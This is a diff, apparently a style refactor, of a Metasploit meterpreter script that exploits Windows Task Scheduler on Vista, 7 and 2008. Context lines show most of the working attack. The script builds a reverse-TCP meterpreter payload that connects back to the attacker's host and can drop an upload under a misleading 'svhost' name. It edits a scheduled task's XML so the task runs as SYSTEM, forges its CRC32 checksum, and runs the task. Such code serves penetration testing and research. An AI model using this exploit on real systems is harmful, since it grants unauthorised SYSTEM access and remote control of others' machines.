@@ -1,10 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
-
 
 ##
 #
@@ -51,17 +50,16 @@ end
 vuln = false
 winver = session.sys.config.sysinfo["OS"]
 affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
-affected.each { |v|
+affected.each do |v|
   if winver.include? v
     vuln = true
     break
   end
-}
-if not vuln
+end
+unless vuln
   print_error("#{winver} is not vulnerable.")
   raise Rex::Script::Completed
 end
-
 
 #
 # We have a chance to succeed, check params
@@ -86,7 +84,7 @@ rport = 4444
 taskname = nil
 cmd = nil
 upload_fn = nil
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, val|
   case opt
 
   when "-c"
@@ -94,7 +92,7 @@ upload_fn = nil
 
   when "-u"
     upload_fn = val
-    if not ::File.exist?(upload_fn)
+    unless ::File.exist?(upload_fn)
       raise "Specified file to upload does not exist!"
     end
 
@@ -110,47 +108,45 @@ upload_fn = nil
   when "-p"
     rport = val.to_i
   end
-}
+end
 
 envs = session.sys.config.getenvs('SystemRoot', 'TEMP')
 sysdir = envs['SystemRoot']
 tmpdir = envs['TEMP']
 
 # Must have at least one of -c or -u
-if not cmd and not upload_fn
+if !cmd && !upload_fn
   print_status("Using default reverse-connect meterpreter payload; -c or -u not specified")
 
   # Get the exe payload.
   pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
   pay.datastore['LHOST'] = rhost
   pay.datastore['LPORT'] = rport
-  raw  = pay.generate
+  raw = pay.generate
   exe = Msf::Util::EXE.to_win32pe(client.framework, raw)
-  #and placing it on the target in %TEMP%
-  tempexename = Rex::Text.rand_text_alpha(rand(8)+6)
+  # and placing it on the target in %TEMP%
+  tempexename = Rex::Text.rand_text_alpha(rand(8) + 6)
   cmd = tmpdir + "\\" + tempexename + ".exe"
   print_status("Preparing connect back payload to host #{rhost} and port #{rport} at #{cmd}")
   fd = client.fs.file.new(cmd, "wb")
   fd.write(exe)
   fd.close
 
-  #get handler to be ready
+  # get handler to be ready
   handler = client.framework.exploits.create("multi/handler")
   handler.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
   handler.datastore['LHOST']   = rhost
   handler.datastore['LPORT']   = rport
   handler.datastore['InitialAutoRunScript'] = "migrate -f"
   handler.datastore['ExitOnSession'] = false
-  #start a handler to be ready
+  # start a handler to be ready
   handler.exploit_simple(
     'Payload'	=> handler.datastore['PAYLOAD'],
-    'RunAsJob'       => true
+    'RunAsJob' => true
   )
 end
 
-if cmd
-  print_status("Using command: #{cmd}")
-end
+print_status("Using command: #{cmd}") if cmd
 
 #
 # Upload the payload command if needed
@@ -161,11 +157,11 @@ if upload_fn
     ext = upload_fn.split('.')
     if ext
       ext = ext.last.downcase
-      if ext == "exe"
-        location << "\\svhost#{rand(100)}.exe"
-      else
-        location << "\\TMP#{rand(100)}.#{ext}"
-      end
+      location << if ext == "exe"
+                    "\\svhost#{rand(100)}.exe"
+                  else
+                    "\\TMP#{rand(100)}.#{ext}"
+                  end
     else
       location << "\\TMP#{rand(100)}"
     end
@@ -184,9 +180,9 @@ end
 def crc32(data)
   table = Zlib.crc_table
   crc = 0xffffffff
-  data.unpack('C*').each { |b|
+  data.unpack('C*').each do |b|
     crc = table[(crc & 0xff) ^ b] ^ (crc >> 8)
-  }
+  end
   crc
 end
 
@@ -265,46 +261,42 @@ def fix_crc32(data, old_crc)
   crc = crc32(data[0, data.length - 12])
   data[-12, 4] = [crc].pack('V')
 
-  data[-12, 12].unpack('C*').reverse.each { |b|
+  data[-12, 12].unpack('C*').reverse.each do |b|
     old_crc = ((old_crc << 8) ^ bwd_table[old_crc >> 24] ^ b) & 0xffffffff
-  }
+  end
   data[-12, 4] = [old_crc].pack('V')
 end
 
 def exec_schtasks(cmdline, purpose)
   lns = cmd_exec("cmd.exe /c " + cmdline + " && echo SCHELEVATOR")
   success = false
-  lns.each_line { |ln|
+  lns.each_line do |ln|
     ln.chomp!
     if ln =~ /^SCHELEVATOR$/
       success = true
     else
       print_status(ln)
     end
-  }
-  raise "Unable to #{purpose}!" if not success
+  end
+  raise "Unable to #{purpose}!" unless success
 end
 
-
-def read_task_file(taskname, taskfile)
+def read_task_file(_taskname, taskfile)
   print_status("Reading the task file contents from #{taskfile}...")
 
   # Can't read the file directly on 2008?
   content = ''
   fd = client.fs.file.new(taskfile, "rb")
-  until fd.eof?
-    content << fd.read
-  end
+  content << fd.read until fd.eof?
   fd.close
 
   content
 end
 
-
 #
 # Create a new task to do our bidding, but make sure it doesn't run.
 #
-taskname ||= Rex::Text.rand_text_alphanumeric(8+rand(8))
+taskname ||= Rex::Text.rand_text_alphanumeric(8 + rand(8))
 taskfile = "#{sysdir}\\system32\\tasks\\#{taskname}"
 
 print_status("Creating task: #{taskname}")
@@ -319,18 +311,17 @@ content = read_task_file(taskname, taskfile)
 #
 # Double-check that we got what we expect.
 #
-if content[0,2] != "\xff\xfe"
-  #
-  # Convert to unicode, since it isn't already
-  #
-  content = content.unpack('C*').pack('v*')
-else
-  #
-  # NOTE: we strip the BOM here to exclude it from the crc32 calculation
-  #
-  content = content[2,content.length]
-end
-
+content = if content[0, 2] != "\xff\xfe"
+            #
+            # Convert to unicode, since it isn't already
+            #
+            content.unpack('C*').pack('v*')
+          else
+            #
+            # NOTE: we strip the BOM here to exclude it from the crc32 calculation
+            #
+            content[2, content.length]
+          end
 
 #
 # Record the crc32 for later calculations
@@ -349,7 +340,7 @@ content = content.unpack('v*').pack('C*')
 content.gsub!('LeastPrivilege', 'HighestAvailable')
 content.gsub!(/<UserId>.*<\/UserId>/, '<UserId>S-1-5-18</UserId>')
 content.gsub!(/<Author>.*<\/Author>/, '<Author>S-1-5-18</Author>')
-#content.gsub!('<LogonType>InteractiveToken</LogonType>', '<LogonType>Password</LogonType>')
+# content.gsub!('<LogonType>InteractiveToken</LogonType>', '<LogonType>Password</LogonType>')
 content.gsub!('Principal id="Author"', 'Principal id="LocalSystem"')
 content.gsub!('Actions Context="Author"', 'Actions Context="LocalSystem"')
 content << "<!-- ZZ -->"
@@ -385,7 +376,6 @@ exec_schtasks("schtasks.exe /change /tn #{taskname} /enable", "enable the task")
 
 print_status("Executing the task...")
 exec_schtasks("schtasks.exe /run /tn #{taskname}", "run the task")
-
 
 #
 # And delete it.
